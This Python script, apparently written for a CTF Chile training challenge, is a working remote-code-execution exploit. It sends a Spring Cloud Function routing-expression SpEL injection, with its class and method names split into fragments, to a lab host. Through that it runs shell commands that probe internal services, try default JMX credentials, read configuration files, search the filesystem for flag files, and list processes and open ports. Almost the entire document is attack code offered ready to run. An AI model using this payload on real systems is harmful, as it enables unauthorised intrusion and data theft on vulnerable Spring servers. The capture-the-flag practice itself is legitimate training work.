#!/usr/bin/env python3
"""
CTF Chile - Explorar servicios locales sin depender de webhook.site
"""
import requests
import time

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

def execute_cmd(cmd, description=""):
    """Ejecutar comando y mostrar resultado directamente"""
    p = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{cmd}"}}).waitFor()'
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)

        print(f"[*] {description}")
        print(f"    Command: {cmd}")
        print(f"    HTTP Status: {r.status_code}")
        if r.status_code == 200:
            print(f"    Response: {r.text}")
        print()
        return r.status_code == 200
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

print("[*] EXPLORACIÓN DE SERVICIOS LOCALES SIN WEBHOOK")
print("="*60)

print("\n[FASE 1] Explorar servicio localhost:8080")

# Explorar el servicio local que encontramos
execute_cmd("curl -s -I http://localhost:8080/", "Verificar headers del servicio local")
execute_cmd("curl -s http://localhost:8080/index.html", "Obtener página index")
execute_cmd("curl -s http://localhost:8080/", "Obtener página raíz")

print("\n[FASE 2] Buscar endpoints comunes en localhost:8080")

common_endpoints = ["/admin", "/api", "/docs", "/swagger", "/actuator", "/health", "/login", "/auth"]
for endpoint in common_endpoints:
    execute_cmd(f"curl -s -I http://localhost:8080{endpoint} | head -2", f"Probar {endpoint}")

print("\n[FASE 3] Probar autenticación en servicio local")

# Probar las credenciales JMX en el servicio local
execute_cmd("curl -s -u monitorRole:QED http://localhost:8080/execute", "Auth JMX en servicio local")
execute_cmd("curl -s -u control:R\\&D http://localhost:8080/execute", "Auth JMX controlRole")

print("\n[FASE 4] Explorar archivos de configuración que creamos")

# Verificar si nuestros archivos de configuración están siendo leídos
execute_cmd("ls -la /app/", "Verificar archivos creados")
execute_cmd("cat /app/application.properties", "Leer configuración creada")

print("\n[FASE 5] Buscar flags directamente")

# Buscar flags sin exfiltración externa
execute_cmd("grep -r 'ctfchile{' /app/ 2>/dev/null", "Buscar flags en /app")
execute_cmd("find / -name 'flag*' -type f 2>/dev/null | head -5 | xargs cat 2>/dev/null", "Buscar archivos flag")

print("\n[FASE 6] Probar localhost:8080 como proxy/gateway")

# Ya que localhost:8080 hace redirect, quizás es un gateway
execute_cmd("curl -s -L http://localhost:8080/api/execute", "Probar execute via gateway")
execute_cmd("curl -s -L http://localhost:8080/internal/execute", "Probar ruta interna")

print("\n[FASE 7] Verificar otros puertos locales")

# Verificar otros puertos que mostraron /execute endpoints
for port in [9090, 8081, 3000, 5000]:
    execute_cmd(f"curl -s -I http://localhost:{port}/ | head -2", f"Servicio puerto {port}")

print("\n[FASE 8] Intentar técnicas de bypass locales")

# Probar bypass usando archivos locales como referencia
execute_cmd("curl -s -H 'X-Config: /app/auth.properties' http://localhost:8080/execute", "Bypass con config local")
execute_cmd("curl -s --cookie 'auth=monitorRole:QED' http://localhost:8080/execute", "Bypass con cookie")

print("\n[FASE 9] Buscar procesos y conexiones")

# Ver qué procesos están corriendo
execute_cmd("ps aux | grep -v grep | grep -E '(java|python|node|uvicorn)'", "Procesos relevantes")
execute_cmd("netstat -tlnp 2>/dev/null | grep -E ':(80|30|50|90)' | head -10", "Puertos activos")

print("\n[FASE 10] Verificar si hay flags en respuestas HTTP")

# Probar si hay flags en las respuestas de error o redirección
execute_cmd("curl -s http://localhost:8080/nonexistent | grep -i ctfchile", "Flag en error 404")
execute_cmd("curl -s http://localhost:8080/admin | grep -i ctfchile", "Flag en admin")

print("\n" + "="*60)
print("[*] EXPLORACIÓN COMPLETADA")
print("[*] Revisar resultados arriba para encontrar pistas de acceso")
print("="*60)